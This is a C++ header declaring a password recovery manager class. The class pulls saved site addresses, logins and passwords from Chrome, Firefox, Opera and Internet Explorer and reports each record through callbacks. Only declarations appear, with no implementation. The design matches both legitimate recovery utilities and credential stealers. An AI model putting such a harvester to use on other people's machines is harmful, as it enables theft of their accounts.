#ifndef _PASSWORD_RECOVERY_MANAGER_H_
#define _PASSWORD_RECOVERY_MANAGER_H_

#pragma once
//////////////////////////////////////////////////////////////////////////
#include "PasswordRecovery.h"
#include "PasswordRecords.h"

class CPasswordRecoveryManager
	: public IPasswordRecoveryCallback
{
public:
	CPasswordRecoveryManager(IPasswordRecoveryCallback* pCallback);
	virtual ~CPasswordRecoveryManager();
public:
	CPasswordRecords& GetPasswordRecords();
public:
	virtual void DoRecovery();
protected:
	void DoRecoveryChrome(IPasswordRecoveryCallback* pCallback);
	void DoRecoveryFirefox(IPasswordRecoveryCallback* pCallback);
	void DoRecoveryOpera(IPasswordRecoveryCallback* pCallback);
	void DoRecoveryInternetExplorer(IPasswordRecoveryCallback* pCallback);
private:
	virtual void OnRecoveryStart();
	virtual void OnRecoveryRecord(LPCTSTR lpszSiteAddress, LPCTSTR lpszLogin, LPCTSTR lpszPassword, LONG nDateCreated);
	virtual void OnRecoveryComplete();
	virtual void OnRecoveryWarning(LPCTSTR lpszMessage);
	virtual void OnRecoveryError(LPCTSTR lpszMessage);
private:
	CPasswordRecords m_cPasswordRecords;

	IPasswordRecovery* m_pChromePasswordRecovery;
	IPasswordRecovery* m_pFirefoxPasswordRecovery;
	IPasswordRecovery* m_pOperaPasswordRecovery;
	IPasswordRecovery* m_pInternetExplorerPasswordRecovery;

	IPasswordRecoveryCallback* m_pPasswordRecoveryCallback;
}; 

#endif // _PASSWORD_RECOVERY_MANAGER_H_